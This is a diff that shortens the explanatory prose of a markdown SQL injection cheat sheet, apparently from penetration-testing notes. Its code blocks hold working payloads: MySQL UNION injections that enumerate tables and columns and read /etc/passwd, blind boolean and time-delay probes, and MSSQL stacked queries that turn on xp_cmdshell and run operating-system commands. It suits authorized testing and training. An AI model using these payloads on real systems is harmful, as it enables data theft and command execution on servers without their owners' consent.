@@ -2,7 +2,7 @@
 
 [← Foothold quick reference](../02-foothold.md)
 
-Start by finding the query context. A quote that works in a string parameter may break a numeric or parenthesized one. Keep a true and a false request side by side so you can see which input changes the response.
+Find string, numeric, or parenthesized context. Compare true/false requests.
 
 ## In-band checks
 
@@ -13,7 +13,7 @@ Start by finding the query context. A quote that works in a string parameter may
 ' UNION SELECT NULL,NULL,NULL-- -
 ```
 
-For `UNION`, match the original column count and compatible types. Move output into a column the page actually displays. The examples below assume MySQL and three columns; change them to fit the observed query.
+MySQL examples below assume three columns; adjust count/types and put output in a visible column.
 
 ```sql
 ' UNION SELECT 1,@@version,3-- -
@@ -22,7 +22,7 @@ For `UNION`, match the original column count and compatible types. Move output i
 ' UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name='users'-- -
 ```
 
-If the database account has `FILE` access and server configuration permits the path, a file read or `INTO OUTFILE` may be possible. Confirm the target path and web server handler first:
+MySQL file read/write: requires `FILE`, allowed path, and a usable web handler for execution.
 
 ```sql
 ' UNION SELECT 1,load_file('/etc/passwd'),3-- -
@@ -31,7 +31,7 @@ If the database account has `FILE` access and server configuration permits the p
 
 ## Blind checks
 
-If the page hides the value, compare a known true condition with a known false one. For a time-based MySQL test, compare the delayed request with a baseline and repeat it before reading one character at a time.
+No visible value: compare true/false, then repeat a delayed MySQL request against baseline.
 
 ```sql
 ' AND (SELECT SUBSTRING(database(),1,1))='a' -- //
@@ -42,7 +42,7 @@ If the page hides the value, compare a known true condition with a known false o
 
 ## MSSQL string context
 
-The leading `';` below closes a single-quoted value and terminates its statement. It is not a universal prefix. A numeric input needs no leading quote; a parenthesized input may need a closing `)`.
+Pick the prefix that fits the input: string `';`, numeric `1;`, or parenthesized `');`.
 
 ```sql
 '; WAITFOR DELAY '00:00:05';-- -
@@ -50,7 +50,7 @@ The leading `';` below closes a single-quoted value and terminates its statement
 '); WAITFOR DELAY '00:00:05';-- -
 ```
 
-Only after the query context is confirmed, inspect the login and server role. `xp_cmdshell` must already be enabled or the SQL context must have enough rights to enable it. Restore any option you changed.
+Check SQL identity and `xp_cmdshell` state/rights:
 
 ```sql
 SELECT SYSTEM_USER;
@@ -59,7 +59,7 @@ SELECT name, value, value_in_use FROM sys.configurations
 WHERE name IN ('show advanced options', 'xp_cmdshell');
 ```
 
-If `xp_cmdshell` is disabled and the SQL login can change it, enable it manually. Record both original values before doing so:
+If authorized to change options, save both original values before enabling:
 
 ```sql
 '; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;-- -
@@ -69,12 +69,10 @@ If `xp_cmdshell` is disabled and the SQL login can change it, enable it manually
 '; EXEC xp_cmdshell 'whoami';-- -
 ```
 
-If both options were originally disabled, restore them when done. Otherwise, restore only the values you changed:
+Restore only options you changed (example assumes both were off):
 
 ```sql
 '; EXEC sp_configure 'xp_cmdshell', 0; RECONFIGURE; EXEC sp_configure 'show advanced options', 0; RECONFIGURE;-- -
 ```
-
-Keep one request and one response for each manual test so you can tell which change produced the result.
 
 SQL Server option behavior: [Microsoft `xp_cmdshell` configuration](https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/xp-cmdshell-server-configuration-option) and [`sys.configurations`](https://learn.microsoft.com/en-us/sql/relational-databases/system-catalog-views/sys-configurations-transact-sql).
